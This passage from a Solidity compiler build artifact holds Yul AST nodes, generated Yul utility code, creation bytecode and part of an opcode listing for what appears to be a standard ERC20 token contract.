																												"nodeType": "YulFunctionCall",
																												"src": "3479:19:5"
																											}
																										],
																										"functionName": {
																											"name": "mload",
																											"nodeType": "YulIdentifier",
																											"src": "3473:5:5"
																										},
																										"nodeType": "YulFunctionCall",
																										"src": "3473:26:5"
																									}
																								],
																								"functionName": {
																									"name": "sstore",
																									"nodeType": "YulIdentifier",
																									"src": "3458:6:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3458:42:5"
																							},
																							"nodeType": "YulExpressionStatement",
																							"src": "3458:42:5"
																						},
																						{
																							"nodeType": "YulAssignment",
																							"src": "3517:24:5",
																							"value": {
																								"arguments": [
																									{
																										"name": "dstPtr",
																										"nodeType": "YulIdentifier",
																										"src": "3531:6:5"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "3539:1:5",
																										"type": "",
																										"value": "1"
																									}
																								],
																								"functionName": {
																									"name": "add",
																									"nodeType": "YulIdentifier",
																									"src": "3527:3:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3527:14:5"
																							},
																							"variableNames": [
																								{
																									"name": "dstPtr",
																									"nodeType": "YulIdentifier",
																									"src": "3517:6:5"
																								}
																							]
																						},
																						{
																							"nodeType": "YulAssignment",
																							"src": "3558:40:5",
																							"value": {
																								"arguments": [
																									{
																										"name": "srcOffset",
																										"nodeType": "YulIdentifier",
																										"src": "3575:9:5"
																									},
																									{
																										"name": "srcOffset_1",
																										"nodeType": "YulIdentifier",
																										"src": "3586:11:5"
																									}
																								],
																								"functionName": {
																									"name": "add",
																									"nodeType": "YulIdentifier",
																									"src": "3571:3:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3571:27:5"
																							},
																							"variableNames": [
																								{
																									"name": "srcOffset",
																									"nodeType": "YulIdentifier",
																									"src": "3558:9:5"
																								}
																							]
																						}
																					]
																				},
																				"condition": {
																					"arguments": [
																						{
																							"name": "i",
																							"nodeType": "YulIdentifier",
																							"src": "3387:1:5"
																						},
																						{
																							"name": "loopEnd",
																							"nodeType": "YulIdentifier",
																							"src": "3390:7:5"
																						}
																					],
																					"functionName": {
																						"name": "lt",
																						"nodeType": "YulIdentifier",
																						"src": "3384:2:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3384:14:5"
																				},
																				"nodeType": "YulForLoop",
																				"post": {
																					"nodeType": "YulBlock",
																					"src": "3399:28:5",
																					"statements": [
																						{
																							"nodeType": "YulAssignment",
																							"src": "3401:24:5",
																							"value": {
																								"arguments": [
																									{
																										"name": "i",
																										"nodeType": "YulIdentifier",
																										"src": "3410:1:5"
																									},
																									{
																										"name": "srcOffset_1",
																										"nodeType": "YulIdentifier",
																										"src": "3413:11:5"
																									}
																								],
																								"functionName": {
																									"name": "add",
																									"nodeType": "YulIdentifier",
																									"src": "3406:3:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3406:19:5"
																							},
																							"variableNames": [
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "3401:1:5"
																								}
																							]
																						}
																					]
																				},
																				"pre": {
																					"nodeType": "YulBlock",
																					"src": "3380:3:5",
																					"statements": []
																				},
																				"src": "3376:236:5"
																			},
																			{
																				"body": {
																					"nodeType": "YulBlock",
																					"src": "3660:166:5",
																					"statements": [
																						{
																							"nodeType": "YulVariableDeclaration",
																							"src": "3678:43:5",
																							"value": {
																								"arguments": [
																									{
																										"arguments": [
																											{
																												"name": "src",
																												"nodeType": "YulIdentifier",
																												"src": "3705:3:5"
																											},
																											{
																												"name": "srcOffset",
																												"nodeType": "YulIdentifier",
																												"src": "3710:9:5"
																											}
																										],
																										"functionName": {
																											"name": "add",
																											"nodeType": "YulIdentifier",
																											"src": "3701:3:5"
																										},
																										"nodeType": "YulFunctionCall",
																										"src": "3701:19:5"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "3695:5:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3695:26:5"
																							},
																							"variables": [
																								{
																									"name": "lastValue",
																									"nodeType": "YulTypedName",
																									"src": "3682:9:5",
																									"type": ""
																								}
																							]
																						},
																						{
																							"expression": {
																								"arguments": [
																									{
																										"name": "dstPtr",
																										"nodeType": "YulIdentifier",
																										"src": "3745:6:5"
																									},
																									{
																										"arguments": [
																											{
																												"name": "lastValue",
																												"nodeType": "YulIdentifier",
																												"src": "3757:9:5"
																											},
																											{
																												"arguments": [
																													{
																														"arguments": [
																															{
																																"arguments": [
																																	{
																																		"arguments": [
																																			{
																																				"kind": "number",
																																				"nodeType": "YulLiteral",
																																				"src": "3784:1:5",
																																				"type": "",
																																				"value": "3"
																																			},
																																			{
																																				"name": "newLen",
																																				"nodeType": "YulIdentifier",
																																				"src": "3787:6:5"
																																			}
																																		],
																																		"functionName": {
																																			"name": "shl",
																																			"nodeType": "YulIdentifier",
																																			"src": "3780:3:5"
																																		},
																																		"nodeType": "YulFunctionCall",
																																		"src": "3780:14:5"
																																	},
																																	{
																																		"kind": "number",
																																		"nodeType": "YulLiteral",
																																		"src": "3796:3:5",
																																		"type": "",
																																		"value": "248"
																																	}
																																],
																																"functionName": {
																																	"name": "and",
																																	"nodeType": "YulIdentifier",
																																	"src": "3776:3:5"
																																},
																																"nodeType": "YulFunctionCall",
																																"src": "3776:24:5"
																															},
																															{
																																"arguments": [
																																	{
																																		"kind": "number",
																																		"nodeType": "YulLiteral",
																																		"src": "3806:1:5",
																																		"type": "",
																																		"value": "0"
																																	}
																																],
																																"functionName": {
																																	"name": "not",
																																	"nodeType": "YulIdentifier",
																																	"src": "3802:3:5"
																																},
																																"nodeType": "YulFunctionCall",
																																"src": "3802:6:5"
																															}
																														],
																														"functionName": {
																															"name": "shr",
																															"nodeType": "YulIdentifier",
																															"src": "3772:3:5"
																														},
																														"nodeType": "YulFunctionCall",
																														"src": "3772:37:5"
																													}
																												],
																												"functionName": {
																													"name": "not",
																													"nodeType": "YulIdentifier",
																													"src": "3768:3:5"
																												},
																												"nodeType": "YulFunctionCall",
																												"src": "3768:42:5"
																											}
																										],
																										"functionName": {
																											"name": "and",
																											"nodeType": "YulIdentifier",
																											"src": "3753:3:5"
																										},
																										"nodeType": "YulFunctionCall",
																										"src": "3753:58:5"
																									}
																								],
																								"functionName": {
																									"name": "sstore",
																									"nodeType": "YulIdentifier",
																									"src": "3738:6:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3738:74:5"
																							},
																							"nodeType": "YulExpressionStatement",
																							"src": "3738:74:5"
																						}
																					]
																				},
																				"condition": {
																					"arguments": [
																						{
																							"name": "loopEnd",
																							"nodeType": "YulIdentifier",
																							"src": "3631:7:5"
																						},
																						{
																							"name": "newLen",
																							"nodeType": "YulIdentifier",
																							"src": "3640:6:5"
																						}
																					],
																					"functionName": {
																						"name": "lt",
																						"nodeType": "YulIdentifier",
																						"src": "3628:2:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3628:19:5"
																				},
																				"nodeType": "YulIf",
																				"src": "3625:201:5"
																			},
																			{
																				"expression": {
																					"arguments": [
																						{
																							"name": "slot",
																							"nodeType": "YulIdentifier",
																							"src": "3846:4:5"
																						},
																						{
																							"arguments": [
																								{
																									"arguments": [
																										{
																											"kind": "number",
																											"nodeType": "YulLiteral",
																											"src": "3860:1:5",
																											"type": "",
																											"value": "1"
																										},
																										{
																											"name": "newLen",
																											"nodeType": "YulIdentifier",
																											"src": "3863:6:5"
																										}
																									],
																									"functionName": {
																										"name": "shl",
																										"nodeType": "YulIdentifier",
																										"src": "3856:3:5"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "3856:14:5"
																								},
																								{
																									"kind": "number",
																									"nodeType": "YulLiteral",
																									"src": "3872:1:5",
																									"type": "",
																									"value": "1"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "3852:3:5"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "3852:22:5"
																						}
																					],
																					"functionName": {
																						"name": "sstore",
																						"nodeType": "YulIdentifier",
																						"src": "3839:6:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "3839:36:5"
																				},
																				"nodeType": "YulExpressionStatement",
																				"src": "3839:36:5"
																			}
																		]
																	},
																	"nodeType": "YulCase",
																	"src": "3222:663:5",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3227:1:5",
																		"type": "",
																		"value": "1"
																	}
																},
																{
																	"body": {
																		"nodeType": "YulBlock",
																		"src": "3902:234:5",
																		"statements": [
																			{
																				"nodeType": "YulVariableDeclaration",
																				"src": "3916:14:5",
																				"value": {
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "3929:1:5",
																					"type": "",
																					"value": "0"
																				},
																				"variables": [
																					{
																						"name": "value",
																						"nodeType": "YulTypedName",
																						"src": "3920:5:5",
																						"type": ""
																					}
																				]
																			},
																			{
																				"body": {
																					"nodeType": "YulBlock",
																					"src": "3965:67:5",
																					"statements": [
																						{
																							"nodeType": "YulAssignment",
																							"src": "3983:35:5",
																							"value": {
																								"arguments": [
																									{
																										"arguments": [
																											{
																												"name": "src",
																												"nodeType": "YulIdentifier",
																												"src": "4002:3:5"
																											},
																											{
																												"name": "srcOffset",
																												"nodeType": "YulIdentifier",
																												"src": "4007:9:5"
																											}
																										],
																										"functionName": {
																											"name": "add",
																											"nodeType": "YulIdentifier",
																											"src": "3998:3:5"
																										},
																										"nodeType": "YulFunctionCall",
																										"src": "3998:19:5"
																									}
																								],
																								"functionName": {
																									"name": "mload",
																									"nodeType": "YulIdentifier",
																									"src": "3992:5:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "3992:26:5"
																							},
																							"variableNames": [
																								{
																									"name": "value",
																									"nodeType": "YulIdentifier",
																									"src": "3983:5:5"
																								}
																							]
																						}
																					]
																				},
																				"condition": {
																					"name": "newLen",
																					"nodeType": "YulIdentifier",
																					"src": "3946:6:5"
																				},
																				"nodeType": "YulIf",
																				"src": "3943:89:5"
																			},
																			{
																				"expression": {
																					"arguments": [
																						{
																							"name": "slot",
																							"nodeType": "YulIdentifier",
																							"src": "4052:4:5"
																						},
																						{
																							"arguments": [
																								{
																									"name": "value",
																									"nodeType": "YulIdentifier",
																									"src": "4111:5:5"
																								},
																								{
																									"name": "newLen",
																									"nodeType": "YulIdentifier",
																									"src": "4118:6:5"
																								}
																							],
																							"functionName": {
																								"name": "extract_used_part_and_set_length_of_short_byte_array",
																								"nodeType": "YulIdentifier",
																								"src": "4058:52:5"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "4058:67:5"
																						}
																					],
																					"functionName": {
																						"name": "sstore",
																						"nodeType": "YulIdentifier",
																						"src": "4045:6:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "4045:81:5"
																				},
																				"nodeType": "YulExpressionStatement",
																				"src": "4045:81:5"
																			}
																		]
																	},
																	"nodeType": "YulCase",
																	"src": "3894:242:5",
																	"value": "default"
																}
															],
															"expression": {
																"arguments": [
																	{
																		"name": "newLen",
																		"nodeType": "YulIdentifier",
																		"src": "3202:6:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3210:2:5",
																		"type": "",
																		"value": "31"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "3199:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "3199:14:5"
															},
															"nodeType": "YulSwitch",
															"src": "3192:944:5"
														}
													]
												},
												"name": "copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "slot",
														"nodeType": "YulTypedName",
														"src": "2871:4:5",
														"type": ""
													},
													{
														"name": "src",
														"nodeType": "YulTypedName",
														"src": "2877:3:5",
														"type": ""
													}
												],
												"src": "2790:1352:5"
											}
										]
									},
									"contents": "{\n    { }\n    function panic_error_0x41()\n    {\n        mstore(0, shl(224, 0x4e487b71))\n        mstore(4, 0x41)\n        revert(0, 0x24)\n    }\n    function abi_decode_string_fromMemory(offset, end) -> array\n    {\n        if iszero(slt(add(offset, 0x1f), end)) { revert(0, 0) }\n        let _1 := mload(offset)\n        let _2 := sub(shl(64, 1), 1)\n        if gt(_1, _2) { panic_error_0x41() }\n        let _3 := not(31)\n        let memPtr := mload(64)\n        let newFreePtr := add(memPtr, and(add(and(add(_1, 0x1f), _3), 63), _3))\n        if or(gt(newFreePtr, _2), lt(newFreePtr, memPtr)) { panic_error_0x41() }\n        mstore(64, newFreePtr)\n        mstore(memPtr, _1)\n        let _4 := 0x20\n        if gt(add(add(offset, _1), _4), end) { revert(0, 0) }\n        let i := 0\n        for { } lt(i, _1) { i := add(i, _4) }\n        {\n            mstore(add(add(memPtr, i), _4), mload(add(add(offset, i), _4)))\n        }\n        mstore(add(add(memPtr, _1), _4), 0)\n        array := memPtr\n    }\n    function abi_decode_tuple_t_string_memory_ptrt_string_memory_ptr_fromMemory(headStart, dataEnd) -> value0, value1\n    {\n        if slt(sub(dataEnd, headStart), 64) { revert(0, 0) }\n        let offset := mload(headStart)\n        let _1 := sub(shl(64, 1), 1)\n        if gt(offset, _1) { revert(0, 0) }\n        value0 := abi_decode_string_fromMemory(add(headStart, offset), dataEnd)\n        let offset_1 := mload(add(headStart, 32))\n        if gt(offset_1, _1) { revert(0, 0) }\n        value1 := abi_decode_string_fromMemory(add(headStart, offset_1), dataEnd)\n    }\n    function extract_byte_array_length(data) -> length\n    {\n        length := shr(1, data)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) { length := and(length, 0x7f) }\n        if eq(outOfPlaceEncoding, lt(length, 32))\n        {\n            mstore(0, shl(224, 0x4e487b71))\n            mstore(4, 0x22)\n            revert(0, 0x24)\n        }\n    }\n    function array_dataslot_string_storage(ptr) -> data\n    {\n        mstore(0, ptr)\n        data := keccak256(0, 0x20)\n    }\n    function clean_up_bytearray_end_slots_string_storage(array, len, startIndex)\n    {\n        if gt(len, 31)\n        {\n            let _1 := 0\n            mstore(_1, array)\n            let data := keccak256(_1, 0x20)\n            let deleteStart := add(data, shr(5, add(startIndex, 31)))\n            if lt(startIndex, 0x20) { deleteStart := data }\n            let _2 := add(data, shr(5, add(len, 31)))\n            let start := deleteStart\n            for { } lt(start, _2) { start := add(start, 1) }\n            { sstore(start, _1) }\n        }\n    }\n    function extract_used_part_and_set_length_of_short_byte_array(data, len) -> used\n    {\n        used := or(and(data, not(shr(shl(3, len), not(0)))), shl(1, len))\n    }\n    function copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage(slot, src)\n    {\n        let newLen := mload(src)\n        if gt(newLen, sub(shl(64, 1), 1)) { panic_error_0x41() }\n        clean_up_bytearray_end_slots_string_storage(slot, extract_byte_array_length(sload(slot)), newLen)\n        let srcOffset := 0\n        let srcOffset_1 := 0x20\n        srcOffset := srcOffset_1\n        switch gt(newLen, 31)\n        case 1 {\n            let loopEnd := and(newLen, not(31))\n            let dstPtr := array_dataslot_string_storage(slot)\n            let i := 0\n            for { } lt(i, loopEnd) { i := add(i, srcOffset_1) }\n            {\n                sstore(dstPtr, mload(add(src, srcOffset)))\n                dstPtr := add(dstPtr, 1)\n                srcOffset := add(srcOffset, srcOffset_1)\n            }\n            if lt(loopEnd, newLen)\n            {\n                let lastValue := mload(add(src, srcOffset))\n                sstore(dstPtr, and(lastValue, not(shr(and(shl(3, newLen), 248), not(0)))))\n            }\n            sstore(slot, add(shl(1, newLen), 1))\n        }\n        default {\n            let value := 0\n            if newLen\n            {\n                value := mload(add(src, srcOffset))\n            }\n            sstore(slot, extract_used_part_and_set_length_of_short_byte_array(value, newLen))\n        }\n    }\n}",
									"id": 5,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "60806040523480156200001157600080fd5b5060405162000b4638038062000b4683398101604081905262000034916200011f565b600362000042838262000218565b50600462000051828262000218565b505050620002e4565b634e487b7160e01b600052604160045260246000fd5b600082601f8301126200008257600080fd5b81516001600160401b03808211156200009f576200009f6200005a565b604051601f8301601f19908116603f01168101908282118183101715620000ca57620000ca6200005a565b81604052838152602092508683858801011115620000e757600080fd5b600091505b838210156200010b5785820183015181830184015290820190620000ec565b600093810190920192909252949350505050565b600080604083850312156200013357600080fd5b82516001600160401b03808211156200014b57600080fd5b620001598683870162000070565b935060208501519150808211156200017057600080fd5b506200017f8582860162000070565b9150509250929050565b600181811c908216806200019e57607f821691505b602082108103620001bf57634e487b7160e01b600052602260045260246000fd5b50919050565b601f8211156200021357600081815260208120601f850160051c81016020861015620001ee5750805b601f850160051c820191505b818110156200020f57828155600101620001fa565b5050505b505050565b81516001600160401b038111156200023457620002346200005a565b6200024c8162000245845462000189565b84620001c5565b602080601f8311600181146200028457600084156200026b5750858301515b600019600386901b1c1916600185901b1785556200020f565b600085815260208120601f198616915b82811015620002b55788860151825594840194600190910190840162000294565b5085821015620002d45787850151600019600388901b60f8161c191681555b5050505050600190811b01905550565b61085280620002f46000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461012357806370a082311461013657806395d89b411461015f578063a457c2d714610167578063a9059cbb1461017a578063dd62ed3e1461018d57600080fd5b806306fdde03146100ae578063095ea7b3146100cc57806318160ddd146100ef57806323b872dd14610101578063313ce56714610114575b600080fd5b6100b66101a0565b6040516100c3919061069c565b60405180910390f35b6100df6100da366004610706565b610232565b60405190151581526020016100c3565b6002545b6040519081526020016100c3565b6100df61010f366004610730565b61024c565b604051601281526020016100c3565b6100df610131366004610706565b610270565b6100f361014436600461076c565b6001600160a01b031660009081526020819052604090205490565b6100b6610292565b6100df610175366004610706565b6102a1565b6100df610188366004610706565b610321565b6100f361019b36600461078e565b61032f565b6060600380546101af906107c1565b80601f01602080910402602001604051908101604052809291908181526020018280546101db906107c1565b80156102285780601f106101fd57610100808354040283529160200191610228565b820191906000526020600020905b81548152906001019060200180831161020b57829003601f168201915b5050505050905090565b60003361024081858561035a565b60019150505b92915050565b60003361025a85828561047e565b6102658585856104f8565b506001949350505050565b600033610240818585610283838361032f565b61028d91906107fb565b61035a565b6060600480546101af906107c1565b600033816102af828661032f565b9050838110156103145760405162461bcd60e51b815260206004820152602560248201527f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77604482015264207a65726f60d81b60648201526084015b60405180910390fd5b610265828686840361035a565b6000336102408185856104f8565b6001600160a01b03918216600090815260016020908152604080832093909416825291909152205490565b6001600160a01b0383166103bc5760405162461bcd60e51b8152602060048201526024808201527f45524332303a20617070726f76652066726f6d20746865207a65726f206164646044820152637265737360e01b606482015260840161030b565b6001600160a01b03821661041d5760405162461bcd60e51b815260206004820152602260248201527f45524332303a20617070726f766520746f20746865207a65726f206164647265604482015261737360f01b606482015260840161030b565b6001600160a01b0383811660008181526001602090815260408083209487168084529482529182902085905590518481527f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925910160405180910390a3505050565b600061048a848461032f565b905060001981146104f257818110156104e55760405162461bcd60e51b815260206004820152601d60248201527f45524332303a20696e73756666696369656e7420616c6c6f77616e6365000000604482015260640161030b565b6104f2848484840361035a565b50505050565b6001600160a01b03831661055c5760405162461bcd60e51b815260206004820152602560248201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604482015264647265737360d81b606482015260840161030b565b6001600160a01b0382166105be5760405162461bcd60e51b815260206004820152602360248201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260448201526265737360e81b606482015260840161030b565b6001600160a01b038316600090815260208190526040902054818110156106365760405162461bcd60e51b815260206004820152602660248201527f45524332303a207472616e7366657220616d6f756e7420657863656564732062604482015265616c616e636560d01b606482015260840161030b565b6001600160a01b03848116600081815260208181526040808320878703905593871680835291849020805487019055925185815290927fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef910160405180910390a36104f2565b600060208083528351808285015260005b818110156106c9578581018301518582016040015282016106ad565b506000604082860101526040601f19601f8301168501019250505092915050565b80356001600160a01b038116811461070157600080fd5b919050565b6000806040838503121561071957600080fd5b610722836106ea565b946020939093013593505050565b60008060006060848603121561074557600080fd5b61074e846106ea565b925061075c602085016106ea565b9150604084013590509250925092565b60006020828403121561077e57600080fd5b610787826106ea565b9392505050565b600080604083850312156107a157600080fd5b6107aa836106ea565b91506107b8602084016106ea565b90509250929050565b600181811c908216806107d557607f821691505b6020821081036107f557634e487b7160e01b600052602260045260246000fd5b50919050565b8082018082111561024657634e487b7160e01b600052601160045260246000fdfea2646970667358221220d4a03f46816d8abc72fd918a2322f2a3c568a20318b17dfd2264e68a262d9d2764736f6c63430008120033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xB46 CODESIZE SUB DUP1 PUSH3 0xB46 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH3 0x34 SWAP2 PUSH3 0x11F JUMP JUMPDEST PUSH1 0x3 PUSH3 0x42 DUP4 DUP3 PUSH3 0x218 JUMP JUMPDEST POP PUSH1 0x4 PUSH3 0x51 DUP3 DUP3 PUSH3 0x218 JUMP JUMPDEST POP POP POP PUSH3 0x2E4 JUMP JUMPDEST PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH3 0x82 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB DUP1 DUP3 GT ISZERO PUSH3 0x9F JUMPI PUSH3 0x9F PUSH3 0x5A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1F DUP4 ADD PUSH1 0x1F NOT SWAP1 DUP2 AND PUSH1 0x3F ADD AND DUP2 ADD SWAP1 DUP3 DUP3 GT DUP2 DUP4 LT OR ISZERO PUSH3 0xCA JUMPI PUSH3 0xCA PUSH3 0x5A JUMP JUMPDEST DUP2 PUSH1 0x40 MSTORE DUP4 DUP2 MSTORE PUSH1 0x20 SWAP3 POP DUP7 DUP4 DUP6 DUP9 ADD ADD GT ISZERO PUSH3 0xE7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP4 DUP3 LT ISZERO PUSH3 0x10B JUMPI DUP6 DUP3 ADD DUP4 ADD MLOAD DUP2 DUP4 ADD DUP5 ADD MSTORE SWAP1 DUP3 ADD SWAP1 PUSH3 0xEC JUMP JUMPDEST PUSH1 0x0 SWAP4 DUP2 ADD SWAP1 SWAP3 ADD SWAP3 SWAP1 SWAP3 MSTORE SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH3 0x133 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB DUP1 DUP3 GT ISZERO PUSH3 0x14B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH3 0x159 DUP7 DUP4 DUP8 ADD PUSH3 0x70 JUMP JUMPDEST SWAP4 POP PUSH1 0x20 DUP6 ADD MLOAD SWAP2 POP DUP1 DUP3 GT ISZERO PUSH3 0x170 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH3 0x17F DUP6 DUP3 DUP7 ADD PUSH3 0x70 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 DUP2 DUP2 SHR SWAP1 DUP3 AND DUP1 PUSH3 0x19E JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH3 0x1BF JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH3 0x213 JUMPI PUSH1 0x0 DUP2 DUP2 MSTORE PUSH1 0x20 DUP2 KECCAK256 PUSH1 0x1F DUP6 ADD PUSH1 0x5 SHR DUP2 ADD PUSH1 0x20 DUP7 LT ISZERO PUSH3 0x1EE JUMPI POP DUP1 JUMPDEST PUSH1 0x1F DUP6 ADD PUSH1 0x5 SHR DUP3 ADD SWAP2 POP JUMPDEST DUP2 DUP2 LT ISZERO PUSH3 0x20F JUMPI DUP3 DUP2 SSTORE PUSH1 0x1 ADD PUSH3 0x1FA JUMP JUMPDEST POP POP POP JUMPDEST POP POP POP JUMP JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x40 SHL SUB DUP2 GT ISZERO PUSH3 0x234 JUMPI PUSH3 0x234 PUSH3 0x5A JUMP JUMPDEST PUSH3 0x24C DUP2 PUSH3 0x245 DUP5 SLOAD PUSH3 0x189 JUMP JUMPDEST DUP5 PUSH3 0x1C5 JUMP JUMPDEST PUSH1 0x20 DUP1 PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH3 0x284 JUMPI PUSH1 0x0 DUP5 ISZERO PUSH3 0x26B JUMPI POP DUP6 DUP4 ADD MLOAD JUMPDEST PUSH1 0x0 NOT PUSH1 0x3 DUP7 SWAP1 SHL SHR NOT AND PUSH1 0x1 DUP6 SWAP1 SHL OR DUP6 SSTORE PUSH3 0x20F JUMP JUMPDEST PUSH1 0x0 DUP6 DUP2 MSTORE PUSH1 0x20 DUP2 KECCAK256 PUSH1 0x1F NOT DUP7 AND SWAP2 JUMPDEST DUP3 DUP2 LT ISZERO PUSH3 0x2B5 JUMPI DUP9 DUP7 ADD MLOAD DUP3 SSTORE SWAP5 DUP5 ADD SWAP5 PUSH1 0x1 SWAP1 SWAP2 ADD SWAP1 DUP5 ADD PUSH3 0x294 JUMP JUMPDEST POP DUP6 DUP3 LT ISZERO PUSH3 0x2D4 JUMPI DUP8 DUP6 ADD MLOAD PUSH1 0x0 NOT PUSH1 0x3 DUP9 SWAP1 SHL PUSH1 0xF8 AND SHR NOT AND DUP2 SSTORE JUMPDEST POP POP POP POP POP PUSH1 0x1 SWAP1 DUP2 SHL ADD SWAP1 SSTORE POP JUMP JUMPDEST PUSH2 0x852 DUP1 PUSH3 0x2F4 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x123 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x136 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x15F JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x167 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x17A JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x18D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0xCC JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0xEF JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x101 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x114 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x1A0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xC3 SWAP2 SWAP1 PUSH2 0x69C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xDF PUSH2 0xDA CALLDATASIZE PUSH1 0x4 PUSH2 0x706 JUMP JUMPDEST PUSH2 0x232 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xC3 JUMP JUMPDEST PUSH1 0x2 SLOAD JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xC3 JUMP JUMPDEST PUSH2 0xDF PUSH2 0x10F CALLDATASIZE PUSH1 0x4 PUSH2 0x730 JUMP JUMPDEST PUSH2 0x24C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x12 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xC3 JUMP JUMPDEST PUSH2 0xDF PUSH2 0x131 CALLDATASIZE PUSH1 0x4 PUSH2 0x706 JUMP JUMPDEST PUSH2 0x270 JUMP JUMPDEST PUSH2 0xF3 PUSH2 0x144 CALLDATASIZE PUSH1 0x4 PUSH2 0x76C JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 SWAP1 KECCAK256 